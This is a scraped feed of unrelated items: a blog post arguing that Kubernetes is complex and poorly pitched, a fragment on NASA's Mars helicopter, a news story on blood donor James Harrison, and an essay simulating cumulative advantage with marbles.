<link>http://jmoiron.net/blog/is-k8s-too-complicated/</link>
<guid isPermaLink="true" >http://jmoiron.net/blog/is-k8s-too-complicated/</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://twitter.com/jbeda&quot;&gt;Joe Beda&lt;/a&gt; had a great twitter thread this morning about the complexity of Kubernetes. You can &lt;a href=&quot;https://twitter.com/jbeda/status/993978918196531200&quot;&gt;read it in full&lt;/a&gt;, and I suggest you do, but I wanted to quote a few things I found to be particularly thought provoking:&lt;/p&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;First off: Kubernetes &lt;em&gt;is&lt;/em&gt; a complex system. It does a lot and brings new abstractions. Those abstractions aren't always justified for all problems. I'm sure that there are plenty of people using Kubernetes that could get by with something simpler.&lt;/p&gt;
&lt;p&gt;The story of computing is creating abstractions. Things that feel awkward at first become the new norm. Higher layers aren't &lt;em&gt;simpler&lt;/em&gt; but rather better suited to different tasks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And, the pick of the bunch:&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;That being said, I think that, as engineers, we tend to discount the complexity we build ourselves vs. complexity we need to learn.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;These are presented somewhat out of order, because I wanted to put particular emphasis on the last one, which I think is a significant source of cognitive bias in engineering at large.&lt;/p&gt;
&lt;p&gt;In the real world, these biases are amplified because &quot;things we build ourselves&quot;&lt;br /&gt;is actually &quot;things we already know&quot;, and this includes &quot;things we already learned&quot;. I suspect that a significant source of programmers flooding into management is the decreasing wavelength of full scale re-education on how to accomplish the exact same thing slightly differently&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; with diminshing returns on tangible benefits.&lt;/p&gt;
&lt;p&gt;I've been &quot;learining&quot; Kubernetes for a significant migration we are attempting at $WORK. I've found it tough going. It's a large thing, and it is &lt;em&gt;very&lt;/em&gt; difficult to know how uninformed my opinion is from my limited exposure. I was originally going to write purely about simplicity and cognitive bias, but then Kris Nova &lt;a href=&quot;https://twitter.com/krisnova/status/994242908315312129&quot;&gt;tweeted&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In a single tweet — can you name a technical benefit you and your team have gained by switching to Kubernetes?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I &lt;em&gt;really&lt;/em&gt; love this tweet, because the tone works if you consider it a question from a point of skepticism or as a search for confirmation. The answers, as it happens, will serve you regardless as well. For me, they highlight a particular problem that I've found over and over again with Kubernetes, and since it's been over a year since I've managed to finish a blog post, I might as well just write about it:&lt;/p&gt;
&lt;p&gt;The k8s elevator pitch is straight up dogshit.&lt;/p&gt;
&lt;p&gt;I've started to see, via my own usage, &lt;em&gt;just&lt;/em&gt; enough of what Kubernetes brings to the table tech wise to start understanding the value, but it's hard to put into words. You can tell it's hard because you can't &lt;a href=&quot;https://twitter.com/search?q=kubernetes&quot;&gt;find it on twitter&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;Want #Kubernetes Clusters on #AzureStack? This will help you run microservices and container-based workloads using the IaaS capabilities of Azure Stack.&lt;/p&gt;
&lt;p&gt;Yesterday the CERN team were playing &quot;public cloud bingo&quot; at #KubeCon, to see how many public clouds they could attach to their Kubernetes federation.&lt;/p&gt;
&lt;p&gt;Everyone wants to know about @IstioMesh at #KubeCon. @DanCiruli explains the gaps it is plugging in #Kubernetes ecosystems&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Right. So what does it do? What can I do with it that I can't do already? Maybe lets look at the &lt;a href=&quot;http://kubernetesstatus.com/&quot;&gt;new feature list&lt;/a&gt;. Oh nice, looks like we're getting &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/58823&quot;&gt;log rotation&lt;/a&gt;, I've only had that since 1994.&lt;/p&gt;
&lt;p&gt;The marketing buries the tech lede. I'm not currently working on my resumé, so I don't actually give a shit how cloud native I'm not. In my limited experience, you get:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;inventory management and visibility&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;common platform for building out tooling related to this (APIs for *)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;decent abstractions for provisioning and deployment&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;service discovery and config management&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Some of this is covered in their &lt;a href=&quot;https://kubernetes.io&quot;&gt;bullet points&lt;/a&gt;, but they are pretty abstract, and all high up on the pyramid of needs. You can't build a large system without most of them, but large systems exist, so clearly Kubernetes is not the only way to do any of this. Unfortunately, if you already have a pretty large deployment you probably &lt;a href=&quot;https://kubernetes.io/docs/admin/cluster-large/&quot;&gt;need multiple clusters&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;However, when you think about them a bit more, they are actually a &lt;em&gt;really&lt;/em&gt; neat thing to find in a box somewhere. As someone who has written the better part of two custom databases, being able to hire someone who already knows your tools is fantastic. Having well written public documentation is really nice.&lt;/p&gt;
&lt;p&gt;It also seems structured in a way that we will be able to really leverage open-sourced work in the burgeoning &quot;infrastructure glue&quot; space. This is a very underrated benefit. The promise of some kind of souk or foodtruck full of Chef recipes&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; that we can all collaborate on and share has proven to be an empty one. Helm and Istio are both harbingers of Kubernetes' complexity and a testament to it working as a platform in ways the previous generation of half-baked&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; devops tools did not.&lt;/p&gt;
&lt;p&gt;Of course, they don't come for free, and even at the surface level there are questions that are difficult to answer or have problematic answers:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;How can I even what is all this yaml?&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;I'd like to run another process oh I cant unless I sidecar it and intimately describe its every relation with the parent's environment via yaml hokay&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;I want to run a database and I don't want you to reschedule me on a computer without any of my data&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;How can this all go wrong and what happens when it does?&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;That first problem is a joke but it &lt;a href=&quot;https://twitter.com/jmoiron/status/989686447367127041&quot;&gt;also kinda isn't&lt;/a&gt;. The second one is a nontrivial annoyance for almost every observability system out there, and making observability harder is a pretty bad first impression for a cloud native management system.&lt;/p&gt;
&lt;p&gt;Alan Perlis &lt;a href=&quot;http://www.cs.yale.edu/homes/perlis-alan/quotes.html&quot;&gt;said&lt;/a&gt; that a programming language was low level when it requires attention to the irrelevant. The rub is that it's difficult to have a firm grasp on relevancy once you add ignorance to the equation, and we're all ignorant in our own ways.&lt;/p&gt;
&lt;p&gt;If you've been around the block developing and deploying large distributed systems, then you know my list of pluses is actually quite compelling. It has an opinion on things that we all agree are important. And for those of us who haven't been around the block, it puts a lot of emphasis on things that will become important as we make our first lap, which is a major contribution to the community.&lt;/p&gt;
&lt;p&gt;But if you have already made decisions, things get complicated.&lt;/p&gt;
&lt;p&gt;Lets use service discovery as an example. We've used service discovery along with health checks and self diagnostics to be able to do some fairly interesting things during outages and, more importantly, &lt;a href=&quot;http://ucare.cs.uchicago.edu/pdf/socc13-limplock.pdf&quot;&gt;slowdowns&lt;/a&gt;. These are hard problems, and we've solved them rather crudely in places, but these solutions still give us a level of proven, necessary sophistication for system stability.&lt;/p&gt;
&lt;p&gt;Unfortunately, our approach is slightly incompatible with Kubernetes' centralized one. Usually, when this happens, your needs are just too sophisticated, but in this case Kubernetes' approach is already &lt;em&gt;explicitly&lt;/em&gt; complex in order to try to deal at the proper level of sophistication. It's a thoughtful and mature approach, but its structure is just inverted from ours. It's complex in incompatible ways, the worst of both worlds.&lt;/p&gt;
&lt;p&gt;Its config management fares worse, as it is complex &lt;em&gt;and&lt;/em&gt; impoverished. There is already a cottage industry of applications attempting to fix this, we'll see if they succeed.&lt;/p&gt;
&lt;p&gt;I've seen this &quot;complex but incompatible&quot; pattern play out a couple times. The attitude towards state in general makes me wonder: do people even &lt;a href=&quot;https://twitter.com/taotetek/status/954131928030023680&quot;&gt;store data themselves&lt;/a&gt; anymore? Maybe that's what I'm missing.&lt;/p&gt;
&lt;p&gt;It all leaves me concerned that the people with the most to gain will also run into the most problems trying to adopt Kubernetes, and while this is natural (large systems tend to be complex), it does make for bad advertising. &quot;Kubernetes doesn't &lt;em&gt;actually&lt;/em&gt; scale&quot; is something I expect to start hearing more and more from people outside the bubble, and it will carry the weight of experience.&lt;/p&gt;
&lt;p&gt;For our particular project, I think we're still getting started when you take into consideration the likely overall lifetime. Still, I suspect that moving an existing architecture wholesale to Kubernetes is a bad idea in general; if you've not grown up within its particular limitations, they will prove to be an endless annoyance&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;, even if there are a host of other tangible benefits over going solo. This may not be limited to Kubernetes, it may just be true for anything, in which case Kubernetes might indeed provide the path of least pain, its room temperature shattered glass fragments an eden compared to red hot glowing obsidian.&lt;/p&gt;
&lt;p&gt;Given Kubernetes' critical mass, time will make an accurate appraisal of its complexity difficult. Will it be able to gracefully adapt to the kinds of advancements that it &lt;em&gt;itself&lt;/em&gt; will bring?&lt;/p&gt;
&lt;p&gt;Like a lot of other tech that has ostensibly &lt;a href=&quot;https://grpc.io/&quot;&gt;come out of google&lt;/a&gt;, it will likely have at least one major source of complexity that 95% of people do not need and will &lt;a href=&quot;https://blog.twitch.tv/twirp-a-sweet-new-rpc-framework-for-go-5f2febbf35f&quot;&gt;not want&lt;/a&gt;. I've not gone looking for a custom implementation of http/2 with a broken congestion window, but maybe one will turn up.&lt;/p&gt;
&lt;p&gt;Many of the problems that Kubernetes provides abstractions for, as opposed to solutions for, will age gracelessly as consensus grows on how to approach them. The balkanization of cluster management systems will fade as consensus solves by convention what is currently open to experimentation. Sources of complexity that seem necessary become over-engineering, the equivalent of pluggable server-side template systems in MVC frameworks in the age of one-page react apps talking to JSON endpoints.&lt;/p&gt;
&lt;p&gt;So, &lt;em&gt;is&lt;/em&gt; it too complicated? Probably. But it'll take a technology generation or so&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; before the simpler core of Kubernetes makes itself known, and what we end up with will probably smell a &lt;em&gt;lot&lt;/em&gt; like it.&lt;/p&gt;
&lt;hr /&gt;&lt;p&gt;1. As an example, I learned JavaScript, then Prototype, then jQuery, then Angular, and when React came out I was so relieved because I could finally decide that the whole enterprise was corrupt and give up any notion of being a &quot;full stack engineer&quot; to work on the backend full time.&lt;/p&gt;
&lt;p&gt;2. I'm going to create SRE/operations software just so I can call it &quot;tortured metaphor&quot; as that seems to be the only real requirement. Its reimagined vocabulary for a bunch of shit we already have words for will be based on dryness, a reference to wit, sarcasm, and the reservoir of joy that led to its creation. Since most people know Chef and Ansible, &lt;a href=&quot;https://docs.saltstack.com/en/latest/topics/mine/index.html&quot;&gt;Saltstack&lt;/a&gt; contains grains, pillars, mines, and minions.&lt;/p&gt;
&lt;p&gt;3. micdrop.&lt;/p&gt;
&lt;p&gt;4. Like OSX's frankly &lt;em&gt;inexcusable&lt;/em&gt; cmd-tab/alt-tab behaviour.&lt;/p&gt;
&lt;p&gt;5. A normal one, not a JavaScript one, so approximately ~3-5 years.&lt;/p&gt;
&lt;p&gt;May 9&lt;/p&gt;

No aircraft has ever taken off from the surface of another planet.&lt;/p&gt;&lt;p&gt;The helicopter's two blades will spin at close to 3,000 revolutions a minute, which Nasa says is about 10 times faster than a standard helicopter on Earth.&lt;/p&gt;&lt;p&gt;&quot;The idea of a helicopter flying the skies of another planet is thrilling,&quot; said Nasa Administrator Jim Bridenstine.&lt;/p&gt;&lt;p&gt;&quot;The Mars Helicopter holds much promise for our future science, discovery, and exploration missions to Mars.&quot;&lt;/p&gt;&lt;p&gt;While the tiny craft is being called a helicopter rather than a drone, there will be no pilot.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Nasa provided this computer-generated image of the helicopter's design
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;It will be flying almost 55 million km (34 million miles) from Earth, too far away to send a remote control signal.&lt;/p&gt;&lt;p&gt;&quot;Earth will be several light minutes away, so there is no way to joystick this mission in real time,&quot; said Mimi Aung, the project manager at Nasa's Jet Propulsion Laboratory.&lt;/p&gt;&lt;p&gt;Instead, the helicopter will &quot;fly the mission on its own&quot;.&lt;/p&gt;&lt;p&gt;The JPL team made the minuscule helicopter as strong as possible to give it the best chance of surviving.&lt;/p&gt;&lt;p&gt;&quot;The altitude record for a helicopter flying here on Earth is about 40,000 feet,&quot; Ms Aung said. &quot;When our helicopter is on the Martian surface, it's already at the Earth equivalent of 100,000 feet up.&quot;&lt;/p&gt;&lt;p&gt;That is part of the reason why Nasa is calling the Mars helicopter a &quot;high risk&quot; project.&lt;/p&gt;&lt;p&gt;&quot;If it does not work, the Mars 2020 mission will not be impacted. If it does work, helicopters may have a real future as low-flying scouts and aerial vehicles to access locations not reachable by ground travel,&quot; Nasa said in a statement.&lt;/p&gt;&lt;p&gt;Existing Mars vehicles have been wheeled devices, which have to navigate around many obstacles in their path and have been confined to fairly large open spaces on the surface of Mars.&lt;/p&gt;&lt;p&gt;One such vehicle, the Spirit rover, got stuck in a patch of sand in 2009, where it eventually ran out of power and shut down. &lt;/p&gt;&lt;p&gt;The Mars 2020 rover - accompanied by its helicopter companion - is due to launch in July of that year and arrive on the red planet in February 2021. &lt;/p&gt;

<title>Man donated blood every week for 60 years and helped save 2.4M babies</title>
<link>https://www.independent.co.uk/news/world/australasia/james-harrison-man-golden-arm-blood-donor-60-years-millions-babies-a8347896.html</link>
<guid isPermaLink="true" >https://www.independent.co.uk/news/world/australasia/james-harrison-man-golden-arm-blood-donor-60-years-millions-babies-a8347896.html</guid>
<description>&lt;p&gt;Known as “the man with the golden arm”, James Harrison is estimated to have saved the lives of 2.4 million babies after giving blood almost every week for 60 years.&lt;/p&gt;
&lt;p&gt;The 81-year-old Australian has donated more than 1,100 times since turning 21.&lt;/p&gt;
&lt;p&gt;Because his blood has unique disease-fighting antibodies, it is used to create an injection which combats rhesus disease – a condition where the blood of pregnant women attacks their unborn babies.&lt;/p&gt;

&lt;p&gt;But after reaching the maximum age for donating blood in his him, he is to retire, the country’s Red Cross Blood Service, which made the estimate about how many lives he has saved.&lt;/p&gt;
&lt;p&gt;&quot;It becomes quite humbling when they say, 'oh you've done this or you've done that or you're a hero’,&quot; said Mr Harrison, who was awarded the Order of Australia, the country's highest honour, in 1999. “It's something I can do. It's one of my talents, probably my only talent, is that I can be a blood donor.&quot;&lt;/p&gt;
&lt;p&gt;In a separate interview with Australia’s &lt;a href=&quot;https://www.9news.com.au/national/2018/05/11/19/08/blood-donor-world-record-holder-james-harrison-final-day-donating&quot; target=&quot;_blank&quot;&gt;9News&lt;/a&gt;, he added: “I've saved a lot of lives and brought a lot of new kids into the world. So that makes me feel good. I increased the population by so many million, I think.&quot;&lt;/p&gt;
&lt;p&gt;Mr Harrison, of New South Wales, discovered his blood had unique properties when he had a lung removed, aged just 14.&lt;/p&gt;
&lt;p&gt;Doctors found it contained an antibody which could be used to create the life-saving ‘Anti-D’ injections.&lt;/p&gt;
&lt;p&gt;So he started making blood plasma donations every week.&lt;/p&gt;
&lt;p&gt;&quot;In Australia, up until about 1967, there were literally thousands of babies dying each year, doctors didn't know why, and it was awful,” Jemma Falkenmire, of the Australian Red Cross Blood Service, told &lt;a href=&quot;https://edition.cnn.com/2018/05/11/health/james-harrison-blood-donor-retires-trnd/index.html?sr=fbCNN051118james-harrison-blood-donor-retires-trnd1020AMVODtop&quot; target=&quot;_blank&quot;&gt;CNN&lt;/a&gt; in 2015. “Women were having numerous miscarriages and babies were being born with brain damage. Australia was one of the first countries to discover a blood donor with this antibody, so it was quite revolutionary at the time.&lt;/p&gt;
&lt;div class=&quot;dnd-widget-wrapper context-sdl_editor_representation type-gallery&quot;&gt;
&lt;div class=&quot;dnd-atom-rendered&quot;&gt;
&lt;div class=&quot;image&quot;&gt;&lt;div class=&quot;container grid-mod-gallery&quot; data-scald-gallery=&quot;3906401&quot;&gt;
&lt;h2 class=&quot;gallery-title&quot;&gt;World news in pictures&lt;/h2&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&quot;Every bag of blood is precious, but James' blood is particularly extraordinary. Every batch of the life-saving Anti-D that has ever been made in Australia has come from James' blood. And more than 17 per cent of women in Australia are at risk so James has helped save a lot of lives.&quot;&lt;/p&gt;
&lt;p&gt;Doctors don’t know for certain why Mr Harrison has this rare blood type, but suspect it may have been caused by the transfusions he received after his lung operation.&lt;/p&gt;
&lt;p&gt;He is one of fewer than 50 people in Australia known to have the antibodies, the blood service said.&lt;/p&gt;
&lt;p&gt;Now he has retired, they are hoping other people will come forward with blood containing similar antibodies. &lt;/p&gt;
&lt;p&gt;&quot;All we can do is hope there will be people out there generous enough to do it, and selflessly in the way he's done,&quot; said Ms Falkenmire.&lt;/p&gt;

&lt;p name=&quot;c2df&quot; id=&quot;c2df&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;In the late 1970s the view in the publishing world was that an author should never produce more than one book a year. The thinking was that publishing more than one book a year would dilute the brand name of the author. However, this was a bit of a problem for Stephen King, who was writing books at a rate of &lt;em class=&quot;markup--em markup--p-em&quot;&gt;two&lt;/em&gt; per year. Instead of slowing down, King decided to publish his additional works under the pen name of &lt;a href=&quot;https://en.wikipedia.org/wiki/Richard_Bachman&quot; data-href=&quot;https://en.wikipedia.org/wiki/Richard_Bachman&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Richard Bachman&lt;/a&gt;.&lt;/p&gt;
&lt;p name=&quot;2eb8&quot; id=&quot;2eb8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Over the next few years, every book King published sold millions, while Richard Bachman remained relatively unknown. King was a legend. Bachman a nobody. However, this all changed when a book store clerk in Washington, D.C. named Steve Brown noticed the similarity of writing styles between King and Bachman. After being confronted with the evidence, King confessed and agreed to an interview with Brown a few weeks later. &lt;a href=&quot;https://amzn.to/2r6XLzr&quot; data-href=&quot;https://amzn.to/2r6XLzr&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Click Moment: Seizing Opportunity in an Unpredictable World&lt;/a&gt; tells the story of what happened next:&lt;/p&gt;
&lt;blockquote name=&quot;c32a&quot; id=&quot;c32a&quot; class=&quot;graf graf--blockquote graf-after--p&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;In 1986, once the secret was out, King re-released all of Bachman’s published works under his real name and they skyrocketed up bestseller lists. The first run of Thinner had sold 28,000 copies — the most of any Bachman book and above average for an author. The moment it became known that Richard Bachman was Stephen King, however, the Bachman books took off with sales quickly reaching 3 million copies.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;0b5e&quot; id=&quot;0b5e&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;This phenomenon isn’t exclusive to Stephen King either. J.K. Rowling published a book called &lt;a href=&quot;https://en.wikipedia.org/wiki/The_Cuckoo%27s_Calling&quot; data-href=&quot;https://en.wikipedia.org/wiki/The_Cuckoo%27s_Calling&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Cuckoo’s Calling&lt;/a&gt; under the pen name Robert Galbraith only to be &lt;a href=&quot;https://www.smithsonianmag.com/science-nature/how-did-computers-uncover-jk-rowlings-pseudonym-180949824/&quot; data-href=&quot;https://www.smithsonianmag.com/science-nature/how-did-computers-uncover-jk-rowlings-pseudonym-180949824/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;outed by someone performing advanced text analysis&lt;/a&gt; with a computer. Shortly after the public discovered Galbraith was Rowling, &lt;em class=&quot;markup--em markup--p-em&quot;&gt;The Cuckoo’s Calling&lt;/em&gt; &lt;a href=&quot;https://www.newstatesman.com/culture/2013/07/sales-cuckoos-calling-surge-150000-after-jk-rowling-revealed-author&quot; data-href=&quot;https://www.newstatesman.com/culture/2013/07/sales-cuckoos-calling-surge-150000-after-jk-rowling-revealed-author&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;increased in sales by over 150,000%&lt;/a&gt; shooting to the #3 on Amazon’s bestseller list after previously being ranked 4,709th.&lt;/p&gt;
&lt;p name=&quot;fd0e&quot; id=&quot;fd0e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Both King and Rowling’s foray into undercover writing reveals a harsh truth about success and social status — &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;winners keep winning&lt;/strong&gt;. This idea is formally known as cumulative advantage, or &lt;a href=&quot;https://en.wikipedia.org/wiki/Matthew_effect&quot; data-href=&quot;https://en.wikipedia.org/wiki/Matthew_effect&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;the Matthew effect&lt;/a&gt;, and explains how those who start with an advantage relative to others can retain that advantage over long periods of time. This effect has also been shown to describe how &lt;a href=&quot;http://www.princeton.edu/~mjs3/salganik_dodds_watts06_full.pdf&quot; data-href=&quot;http://www.princeton.edu/~mjs3/salganik_dodds_watts06_full.pdf&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;music gets popular&lt;/a&gt;, but applies to any domain that can result in fame or social status. I discovered this concept by reading &lt;a href=&quot;https://twitter.com/mjmauboussin&quot; data-href=&quot;https://twitter.com/mjmauboussin&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Michael Mauboussin’s&lt;/a&gt; &lt;a href=&quot;https://amzn.to/2roUvid&quot; data-href=&quot;https://amzn.to/2roUvid&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Success Equation&lt;/a&gt; where he writes:&lt;/p&gt;
&lt;blockquote name=&quot;0eff&quot; id=&quot;0eff&quot; class=&quot;graf graf--blockquote graf-after--p&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;The Matthew effect explains how two people can start in nearly the same place and end up worlds apart. In these kinds of systems, initial conditions matter. And as time goes on, they matter more and more.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;007c&quot; id=&quot;007c&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;This explains how King and Rowling sell millions while Bachman and Galbraith don’t, despite being of similar quality. While I find these anecdotes &lt;a href=&quot;https://mobile.nytimes.com/2007/04/15/magazine/15wwlnidealab.t.html&quot; data-href=&quot;https://mobile.nytimes.com/2007/04/15/magazine/15wwlnidealab.t.html&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;and others&lt;/a&gt; useful, we can illustrate cumulative advantage using a simple simulation.&lt;/p&gt;
&lt;p name=&quot;3d66&quot; id=&quot;3d66&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;To start, imagine we have 400 marbles in a bag equally spread across 4 different colors (i.e. 100 black, 100 blue, 100 red, 100 green). Now we draw a color at random and add 1 &lt;em class=&quot;markup--em markup--p-em&quot;&gt;additional&lt;/em&gt; marble of that &lt;em class=&quot;markup--em markup--p-em&quot;&gt;same&lt;/em&gt; color back to the bag. So, if we drew a green marble in the first round, we would have 101 green marbles, 100 red, 100 black, and 100 blue in the bag at &lt;em class=&quot;markup--em markup--p-em&quot;&gt;the&lt;/em&gt; &lt;em class=&quot;markup--em markup--p-em&quot;&gt;end&lt;/em&gt; of the first round. We would keep drawing marbles and adding the 1 additional marble to the bag over 40 rounds and then end the game.&lt;/p&gt;
&lt;p name=&quot;53d2&quot; id=&quot;53d2&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;One such simulation of this game could look like this (Note: the colors represent the marble market shares in each round):&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;4b6e&quot; id=&quot;4b6e&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As you can see, there is very little variation in market shares because the reward size (1 marble) is small relative to the total number of starting marbles (400). The distribution of the market share at round 40 (“final market share”) across 1,000 simulations for any one color could look like this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;4881&quot; id=&quot;4881&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As we expect, the mean final market share with no starting advantage is 25% with a very small standard deviation.&lt;/p&gt;
&lt;p name=&quot;4486&quot; id=&quot;4486&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;However, &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;what if we rigged the game such that we gave a particular color an advantage to start?&lt;/strong&gt; For example, instead of giving 1 &lt;em class=&quot;markup--em markup--p-em&quot;&gt;additional&lt;/em&gt; marble in each round, we give 100 additional marbles in each round. If we did this, one color would have a market share of 40% (200/500) while the remaining colors had a share 20% (100/500) starting round 2. This is a starting advantage of 20% (40% — 20%) in market share. One such simulation, where green is given the starting advantage, could look like this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;7a98&quot; id=&quot;7a98&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As you can see, the green color starts with a huge lead and never gives it up over time. Across 1,000 simulations like the one above, the distribution of final market share for the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;advantaged&lt;/em&gt; color (i.e. green) could look like this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*wZFeOPD1JIaF9xUUh7g0XQ.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*wZFeOPD1JIaF9xUUh7g0XQ.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*wZFeOPD1JIaF9xUUh7g0XQ.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;6e27&quot; id=&quot;6e27&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;With that 20% initial advantage, the final market share increases significantly. &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;What is even more amazing is that this advantage was &lt;em class=&quot;markup--em markup--p-em&quot;&gt;only&lt;/em&gt; &lt;em class=&quot;markup--em markup--p-em&quot;&gt;given in the first round&lt;/em&gt; and everything after that was left to chance.&lt;/strong&gt; If we were to keep increasing the size of the starting advantage, the distribution of final market shares would continue to increase as well:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*VVyyYmfpClVoVZJc7Txujw.gif&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*VVyyYmfpClVoVZJc7Txujw.gif&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*VVyyYmfpClVoVZJc7Txujw.gif&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;8202&quot; id=&quot;8202&quot; class=&quot;graf graf--p graf-after--figure graf--trailing&quot;&gt;The purpose of this simulation is to demonstrate how important starting conditions are when determining long term outcomes. Instead of marbles though it could be wealth, or popularity, or book sales. And most of these outcomes are greatly influenced by chance events. We like to think in America that most things come down to hard work, but a few lucky (or unlucky) breaks early on can have lasting effects over decades. If we look at luck in this way, it can change the way you view your life…&lt;/p&gt;
